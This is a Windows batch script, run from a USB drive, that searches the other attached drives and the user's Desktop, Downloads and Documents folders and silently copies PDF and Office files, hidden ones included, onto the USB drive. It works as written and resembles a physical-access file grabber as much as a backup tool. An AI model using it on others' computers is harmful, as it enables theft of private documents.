@echo off
setlocal enabledelayedexpansion

REM Specify the file extensions to search for
set "extensions=.pdf .pptx .ppt .docx .doc"

REM Specify the destination folder on the USB drive
set "destination=%~dp0Files"

REM Create the destination folder if it doesn't exist
if not exist "%destination%" mkdir "%destination%"

REM Get the drive letter of the USB drive where the script is located
for %%P in ("%~d0") do set "usb_drive=%%~P"

REM Display USB drive letter
echo USB drive letter: %usb_drive%

REM Get list of all drive letters
for /f %%D in ('wmic logicaldisk get caption ^| findstr /r "[A-Z]:"') do (
    REM Check if the current drive is not the USB drive
    if /i not "%%D"=="%usb_drive%" if /i not "%%D"=="C:" (
        REM Display current drive being searched
        echo copying from %%D
        REM Search for files with specified extensions on the drive and copy them to the destination folder
        for %%E in (%extensions%) do (
            REM Search for files recursively and copy them to the destination folder
            xcopy "%%D\*%%~nxE" "%destination%" /s /i /y /h /d 2>nul
        )
    )
)


for %%F in ("Desktop" "Downloads" "Documents") do (
    echo copying from %%F
    for %%E in (%extensions%) do (
        xcopy "%USERPROFILE%\%%F\*%%~nxE" "%destination%\%%F\" /s /i /y /h /d 2>nul
    )
)

echo All files copied to USB.

:end
